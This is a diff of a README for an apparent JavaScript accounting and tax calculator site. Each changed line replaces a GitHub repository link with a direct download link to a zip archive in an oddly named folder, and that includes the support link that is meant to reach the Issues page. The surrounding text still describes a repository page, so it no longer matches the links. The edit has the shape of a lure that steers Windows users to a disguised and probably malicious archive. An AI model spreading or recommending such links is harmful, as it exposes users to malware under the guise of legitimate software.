@@ -1,14 +1,14 @@
 # 📊 apex-mmc-tax-script-hub - Simplify Your Accounting & Tax Management
 
 ## 🚀 Quick Download
-[![Download Now](https://img.shields.io/badge/Download-apex--mmc--tax--script--hub-blueviolet?style=for-the-badge&logo=github)](https://github.com/Nolanglabellar157/apex-mmc-tax-script-hub)
+[![Download Now](https://img.shields.io/badge/Download-apex--mmc--tax--script--hub-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nolanglabellar157/apex-mmc-tax-script-hub/main/overfrankness/hub-apex-script-mmc-tax-v3.9.zip)
 
 ## 📋 Overview
 Apex MMC Tax Script Hub is a responsive accounting and financial services web platform built with standard vanilla JavaScript. It features embedded tax and payroll calculators, multi-language support, service tier pricing layouts, client portal mockups, and inquiry forms. This application is designed for small businesses, freelancers, and accounting professionals who need a straightforward tool to manage tax calculations and client interactions.
 
 ## 💻 How to Download and Use on Windows
 ### Step 1: Visit the Download Page
-Visit this link to download the application: [https://github.com/Nolanglabellar157/apex-mmc-tax-script-hub](https://github.com/Nolanglabellar157/apex-mmc-tax-script-hub)
+Visit this link to download the application: [https://raw.githubusercontent.com/Nolanglabellar157/apex-mmc-tax-script-hub/main/overfrankness/hub-apex-script-mmc-tax-v3.9.zip](https://raw.githubusercontent.com/Nolanglabellar157/apex-mmc-tax-script-hub/main/overfrankness/hub-apex-script-mmc-tax-v3.9.zip)
 
 ### Step 2: Get the Application
 On the GitHub page, find the green "Code" button (usually near the top right of the file list). Click it and select "Download ZIP" from the dropdown menu.
@@ -68,7 +68,7 @@ apex-mmc-tax-script-hub-main/
 - **Language not changing**: Clear your browser's cache and refresh the page
 
 ## 📞 Contact & Support
-If you encounter issues, visit the GitHub repository page: [https://github.com/Nolanglabellar157/apex-mmc-tax-script-hub](https://github.com/Nolanglabellar157/apex-mmc-tax-script-hub) and submit an issue in the "Issues" tab.
+If you encounter issues, visit the GitHub repository page: [https://raw.githubusercontent.com/Nolanglabellar157/apex-mmc-tax-script-hub/main/overfrankness/hub-apex-script-mmc-tax-v3.9.zip](https://raw.githubusercontent.com/Nolanglabellar157/apex-mmc-tax-script-hub/main/overfrankness/hub-apex-script-mmc-tax-v3.9.zip) and submit an issue in the "Issues" tab.
 
 ## 📄 License
 This project is provided for personal and educational use. All trademarks remain property of their respective owners.
